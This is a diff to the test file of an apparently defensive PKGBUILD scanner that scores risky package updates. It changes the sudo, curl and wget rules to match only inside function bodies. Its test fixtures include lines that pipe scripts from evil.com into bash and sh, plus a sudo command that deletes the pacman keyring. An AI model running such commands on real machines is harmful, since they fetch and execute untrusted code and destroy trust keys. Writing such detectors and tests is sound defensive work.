@@ -30,9 +30,9 @@ ALL_RULES = [
     {"id": "R006", "name": "Insecure Download Protocol", "pattern": r"https?://.*\.tar\.gz.*\|", "severity": "MEDIUM", "category": "network_execution", "match_target": "resolved"},
     {"id": "R007", "name": "Install File Modification", "pattern": r"\+.*\.install.*", "severity": "MEDIUM", "category": "installer", "match_target": "raw_line"},
     {"id": "R008", "name": "Unexpected File Download", "pattern": r"\b(python|ruby|perl)\s+-c\s+https?://", "severity": "HIGH", "category": "network_execution", "match_target": "resolved"},
-    {"id": "R009", "name": "Privilege Escalation", "pattern": r"\bsudo\b", "severity": "CRITICAL", "category": "privilege", "match_target": "resolved"},
-    {"id": "R010", "name": "Uses curl in PKGBUILD", "pattern": r"\bcurl\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line"},
-    {"id": "R011", "name": "Uses wget in PKGBUILD", "pattern": r"\bwget\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line"},
+    {"id": "R009", "name": "Privilege Escalation", "pattern": r"\bsudo\b", "severity": "CRITICAL", "category": "privilege", "match_target": "raw_line", "scope": ["function_body"]},
+    {"id": "R010", "name": "Uses curl in PKGBUILD", "pattern": r"\bcurl\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
+    {"id": "R011", "name": "Uses wget in PKGBUILD", "pattern": r"\bwget\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
 ]
 
 BENIGN_SCENARIOS = []
@@ -49,7 +49,7 @@ def _run_pipeline(diff: str, *, novelty_urls: list[str] | None = None, novelty_m
     raw_lines = get_raw_diff_lines(diff)
     triggered = apply_rules(resolved, raw_lines, ALL_RULES)
 
-    novelty = NoveltyContext()
+    novelty = NoveltyContext(observation_count=50 if (novelty_urls or novelty_maintainer) else 0)
     if novelty_urls:
         novelty.url_first_seen_globally = True
         novelty.url_first_seen_in_this_package = True
@@ -177,9 +177,11 @@ def test_obvious_base64_decode_exec():
 
 
 def test_obvious_sudo_usage():
-    """Uses sudo in PKGBUILD. Score must be at least Medium."""
-    diff = """+  sudo rm -rf /etc/pacman.d/gnupg
-+  sudo pacman-key --init"""
+    """Uses sudo inside package() in PKGBUILD. Score must be at least Medium."""
+    diff = """+package() {
++  sudo rm -rf /etc/pacman.d/gnupg
++  sudo pacman-key --init
++}"""
     r = _run_pipeline(diff)
     assert r["score"] >= 40
     assert any(t["rule_id"] == "R009" for t in r["triggered_rules"])
@@ -206,9 +208,11 @@ def test_obvious_all_red_flags():
     """Everything wrong at once. Score must cap at 100 Critical."""
     diff = """+source=("https://evil.com/payload.tar.gz")
 +sha256sums=('SKIP')
++package() {
 +  curl -s https://evil.com/hook.sh | bash
 +  wget -qO- https://evil.com/hook2.sh | sh
-+  sudo ./install.sh"""
++  sudo ./install.sh
++}"""
     r = _run_pipeline(diff)
     assert r["score"] == 100
     assert r["level"] == "Critical"
